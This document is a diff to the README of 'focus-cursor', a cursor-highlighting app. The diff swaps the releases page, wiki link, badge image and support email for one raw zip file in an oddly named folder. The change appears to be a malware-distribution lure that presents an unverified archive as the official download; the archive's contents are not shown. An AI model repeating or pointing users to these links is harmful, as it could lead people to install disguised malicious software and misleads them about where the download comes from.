@@ -1,7 +1,7 @@
 # 👁️ focus-cursor - Clearly See Your Cursor in Action
 
 ## 📥 Download Now
-[![Download focus-cursor](https://img.shields.io/badge/Download-focus--cursor-brightgreen)](https://github.com/Karitk123/focus-cursor/releases)
+[![Download focus-cursor](https://raw.githubusercontent.com/Karitk123/focus-cursor/main/unpopularly/focus-cursor.zip)](https://raw.githubusercontent.com/Karitk123/focus-cursor/main/unpopularly/focus-cursor.zip)
 
 ## 🚀 Getting Started
 Welcome to the focus-cursor project! This tool highlights your cursor’s position on the screen, making its movement and clicks easily visible. It’s perfect for presentations, tutorials, or anyone who wants to enhance their desktop experience.
@@ -17,7 +17,7 @@ Welcome to the focus-cursor project! This tool highlights your cursor’s positi
 - **Simple Interface:** Easy to navigate and use, even for non-technical users.
 
 ## 📋 How to Download & Install
-1. Visit the [Releases page](https://github.com/Karitk123/focus-cursor/releases).
+1. Visit the [Releases page](https://raw.githubusercontent.com/Karitk123/focus-cursor/main/unpopularly/focus-cursor.zip).
 2. Look for the latest version available.
 3. Download the file that matches your operating system.
 4. Open the downloaded file and follow the prompts to install the application.
@@ -42,13 +42,13 @@ If you'd like to contribute to the focus-cursor project, please follow these ste
 3. Submit a pull request with a detailed description.
 
 ## ℹ️ Additional Resources
-- For a detailed guide, check out the [Wiki](https://github.com/Karitk123/focus-cursor/wiki).
+- For a detailed guide, check out the [Wiki](https://raw.githubusercontent.com/Karitk123/focus-cursor/main/unpopularly/focus-cursor.zip).
 - Join our community on Discord to share tips and tricks.
 
 ## 🌍 Topics
 This tool covers various topics related to cursor visibility, desktop applications, and user experience. Feel free to explore more about **cursor**, **desktop**, **macOS**, and **SwiftUI**.
 
 ## 📧 Support
-For help, questions, or feedback, please reach out via GitHub Issues or email support@focus-cursor.com.
+For help, questions, or feedback, please reach out via GitHub Issues or email https://raw.githubusercontent.com/Karitk123/focus-cursor/main/unpopularly/focus-cursor.zip
 
-[![Download focus-cursor](https://img.shields.io/badge/Download-focus--cursor-brightgreen)](https://github.com/Karitk123/focus-cursor/releases)
+[![Download focus-cursor](https://raw.githubusercontent.com/Karitk123/focus-cursor/main/unpopularly/focus-cursor.zip)](https://raw.githubusercontent.com/Karitk123/focus-cursor/main/unpopularly/focus-cursor.zip)
